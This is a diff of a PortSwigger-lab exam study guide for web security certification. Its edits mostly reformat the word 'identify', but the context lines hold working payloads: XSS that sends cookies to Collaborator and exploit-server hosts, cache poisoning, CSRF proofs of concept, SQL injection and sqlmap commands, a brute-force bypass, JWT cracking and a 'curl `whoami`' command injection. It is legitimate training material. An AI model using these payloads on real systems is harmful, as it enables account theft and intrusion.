@@ -249,7 +249,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 [PortSwigger Lab: DOM XSS using web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)  
 ### DOM Cookie Stealer  
 
->In the **Search** function a Reflected XSS vulnerability is identified. The attacker then deliver an exploit link to victim with cookie stealing payload in a hosted **iframe** on their exploit server.  
+>In the **Search** function a Reflected XSS vulnerability is ***identified*** using ```\"-alert(1)}//``` payload. The attacker then deliver an exploit phishing link to the victim with a cookie stealing payload inside a hosted **iframe** on their exploit server.  
 
 >***Identify*** The search JavaScript code on the target, return a JSON response. Validate that the backslash **\\** escape is not sanitized, and the JSON data is then send to **eval()**.  Backslash is not escaped correct and when the JSON response attempts to escape the opening double-quotes character, it adds a **second** backslash. The resulting double-backslash causes the escaping to be effectively cancelled out.  
 
@@ -303,7 +303,7 @@ document.cookie = "TopSecret=UnsecureCookieValue4Peanut2019";
   
 ### Identify allowed Tags  
 
->The below lab gives great **Methodology** to identify allowed HTML tags and events for crafting POC XSS.  
+>The below lab gives great **Methodology** to ***identify*** allowed HTML tags and events for crafting POC XSS.  
 
 [PortSwigger Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)  
   
@@ -334,7 +334,7 @@ https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocume
   
 ### XSS Assign protocol  
 
->Lab to test XSS into HTML context with nothing encoded in search function. Using this lab to test the **Assignable protocol with location** ```javascript``` identified by [PortSwigger XSS research](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#assignable-protocol-with-location). In the payload is the ```%0a``` representing the ASCII newline character.  
+>Lab to test XSS into HTML context with nothing encoded in search function. Using this lab to test the **Assignable protocol with location** ```javascript``` exploit ***identified*** by [PortSwigger XSS research](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#assignable-protocol-with-location). In the payload is the ```%0a``` representing the ASCII newline character.  
 
 ```html
 <script>location.protocol='javascript';</script>#%0adocument.location='http://0xyjdsa2etgbxef5lwgj5rj6mxsoge43.oastify.com/?p='+document.cookie//&context=html
@@ -412,7 +412,7 @@ location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location
 <iframe src="https://TARGET.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
 ```  
 
->Note: ***Identify*** in below lab the vulnerable jquery 1.8.2 version used with the CSS selector to identify **hashchange**.  
+>Note: ***Identify*** the vulnerable jquery 1.8.2 version used in the lab with the CSS selector to ***identify*** **hashchange**.  
 
 ![Hashchange](images/hashchange.png)  
 
@@ -658,7 +658,7 @@ GET /?utm_content='/><script>document.location="https://Collaborator.com?c="+doc
 
 ### Poison ambiguous request  
 
->Adding a second **Host** header with an exploit server, this identify a ambiguous cache vulnerability and routing your request. Notice that the exploit server in second **Host** header is reflected in an absolute URL used to import a script from ```/resources/js/tracking.js```. 
+>Adding a second **Host** header with an exploit server, this ***identify*** a ambiguous cache vulnerability and routing your request. Notice that the exploit server in second **Host** header is reflected in an absolute URL used to import a script from ```/resources/js/tracking.js```. 
 
 ```html
 GET / HTTP/1.1
@@ -1024,7 +1024,7 @@ document.location='https://EXPLOIT.net/StealCookie='+document.cookie
 
 ### Brute Force Protected Login  
 
->***Identified*** brute force protection on login when back-end enforce 30 minute ban, resulting in **IP blocked** after too many invalid login attempts. Testing ```X-Forwarded-For:``` header result in bypass of brute force protection. Observing the response time with long invalid password, mean we can use **Pitchfork** technique to identify first valid usernames with random long password and then rerun intruder with **Pitchfork**, set each payload position attack iterates through all sets simultaneously.  
+>***Identified*** brute force protection on login when back-end enforce 30 minute ban, resulting in **IP blocked** after too many invalid login attempts. Testing ```X-Forwarded-For:``` header result in bypass of brute force protection. Observing the response time with long invalid password, mean we can use **Pitchfork** technique to ***identify*** first valid usernames with random long password and then rerun intruder with **Pitchfork**, set each payload position attack iterates through all sets simultaneously.  
 
 [Burp Lab Username, Password and directory fuzzing Word lists](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/wordlists)  
 
@@ -1046,7 +1046,7 @@ X-Forwarded-For: 12.13.14.15
 
 ![Subtly invalid login](images/subtly-invalid-login.png)  
 
->Notice on the Intruder attack column for the GREP value, ```Invalid username or password.``` the one response message for a failed username attack do not contain full stop period at the end. Repeat the attack with this identified username, and **Sniper** attack the password field to ***identify*** 302 response for valid login. In the exam ***lookout*** for other input field disclosing valid accounts on the application and brute force identified account passwords.  
+>Notice on the Intruder attack column for the GREP value, ```Invalid username or password.``` the one response message for a failed username attack do not contain full stop period at the end. Repeat the attack with this ***identified*** username, and **Sniper** attack the password field to ***identify*** ```302``` response for valid login. In the exam ***lookout*** for other input field disclosing valid accounts on the application and brute force ***identified*** account passwords.  
 
 [PortSwigger Lab: Username enumeration via subtly different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses)  
   
@@ -1162,7 +1162,7 @@ Referrer-Policy: unsafe-url
   
 ### Referer Header Present  
 
->In the update email request when changing the ```referer``` header the response indicate invalid referer header, identifying CSRF vulnerability. Using the ```<meta name="referrer" content="no-referrer">``` as part of the exploit server CSRF PoC this control can be bypassed.  
+>In the update email request when changing the ```referer``` header the response indicate invalid referer header, ***identifying*** CSRF vulnerability. Using the ```<meta name="referrer" content="no-referrer">``` as part of the exploit server CSRF PoC this control can be bypassed.  
 
 ```
 <html>
@@ -1248,7 +1248,7 @@ history.pushState('', '', '/');
 
 ### Is Logged In  
   
->If cookie with the **isloggedin** name is identified, then a refresh of admin password POST request could be exploited. Change username parameter to administrator while logged in as low privilege user, CSRF where token is not tied to user session.  
+>If cookie with the **isloggedin** name is ***identified***, then a refresh of admin password POST request could be exploited. Change username parameter to administrator while logged in as low privilege user, CSRF where token is not tied to user session.  
 
 ```html
 POST /refreshpassword HTTP/1.1
@@ -1300,7 +1300,7 @@ csrf=TOKEN&username=administrator
   
 >Error based or Blind SQL injection vulnerabilities, allow SQL queries in an application to be used to extract data or login credentials from the  database. SQLMAP is used to fast track the exploit and retrieve the sensitive information.  
 
->***Identify*** SQLi, by adding a double (") or single quote (') to web parameters or tracking cookies, if this break the SQL syntax resulting in error message response, then positive SQL injection identified.  
+>***Identify*** SQLi, by adding a double (") or single quote (') to web parameters or tracking cookies, if this break the SQL syntax resulting in error message response, then positive SQL injection ***identified***.  
 
 [SQL Injection cheat sheet examples](https://portswigger.net/web-security/sql-injection/cheat-sheet)  
 
@@ -1340,13 +1340,13 @@ TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encod
   
 ### Blind SQLi Conditional Response
 
->This blind SQL injection is identified by a small message difference in the responses. When sending a valid true SQL query the response contain ```Welcome back``` string in response. Invalid false SQL query statement do not contain the response conditional message.  
+>This blind SQL injection is ***identified*** by a small message difference in the responses. When sending a valid true SQL query the response contain ```Welcome back``` string in response. Invalid false SQL query statement do not contain the response conditional message.  
 
 ```
 ' AND '1'='1
 ```
 
->False SQL statement to identify conditional message not in response.  
+>False SQL statement to ***identify*** conditional message not in response.  
 
 ```
 ' AND '1'='2
@@ -1450,7 +1450,7 @@ sqlmap -v -u 'https://TARGET.net/filter?category=*' -p 'category' --batch --flus
 '+UNION+SELECT+'fuzzer',NULL--
 ```  
 
->Next identifying a list of **tables** in the database.  
+>Next ***identifying*** a list of **tables** in the database.  
 
 ```SQL
 '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
@@ -1547,7 +1547,7 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
   
 ## ProtoType Pollution  
 
->A target is vulnerable to DOM XSS via client side prototype pollution. **[DOM Invader](#dom-invader)** will identify the gadget and using a hosted payload to performing phishing directed at the victim and steal their cookie.  
+>A target is vulnerable to DOM XSS via client side prototype pollution. **[DOM Invader](#dom-invader)** will ***identify*** the gadget and using a hosted payload to performing phishing directed at the victim and steal their cookie.  
 
 >Exploit server Body section, host an exploit that will navigate the victim to a malicious URL.  
 
@@ -1630,7 +1630,7 @@ Connection: close
 
 ### Original URL  
 
->Admin portal only accessible from internal. Identify if access control can be bypassed using header ```X-Original-URL```, observe different response to ```/admin``` endpoint requests depending on header value.  
+>Admin portal only accessible from internal. ***Identify*** if access control can be bypassed using header ```X-Original-URL```, observe different response to ```/admin``` endpoint requests depending on header value.  
 
 ```
 X-Original-URL: /admin
@@ -2103,7 +2103,7 @@ ${foobar}
 
 ### Tornado  
 
->Tornado Template can be identified using a ```}}{{ 7*7}}``` payload that breakout of current expression and evaluate ```7*7```.  
+>Tornado Template can be ***identified*** using a ```}}{{ 7*7}}``` payload that breakout of current expression and evaluate ```7*7```.  
 
 ```
 }}
@@ -2332,7 +2332,7 @@ fileurl=https://EXPLOIT.net/images.sVg
   
 ### CustomTemplate PHP  
 
->Reading page source code and noticing comment mentioning **<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->**, this ***identify*** possible PHP framework and the Burp scanner identify serialized session cookie object after we logged in with stolen ```wiener:peter``` credentials.  
+>Reading page source code and noticing comment mentioning **<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->**, this ***identify*** possible PHP framework and the Burp scanner ***identify*** serialized session cookie object after we logged in with stolen ```wiener:peter``` credentials.  
 
 ![info-disclose](images/info-disclose.png)  
 
@@ -2455,7 +2455,7 @@ email=carlos@exam.net||curl+`whoami`.COLLABORATOR.net||
 
 ![MicahVanDeusens-blog](images/MicahVanDeusens-blog.png)  
   
->The image below is my view of possible vulnerabilities identified and exploitation to reach the next BSCP exam stage and progress through the exam challenges.  
+>The image below is my view of possible vulnerabilities ***identified*** and exploitation to reach the next BSCP exam stage and progress through the exam challenges.  
 
 ![Three stages](images/3stages.png)  
   
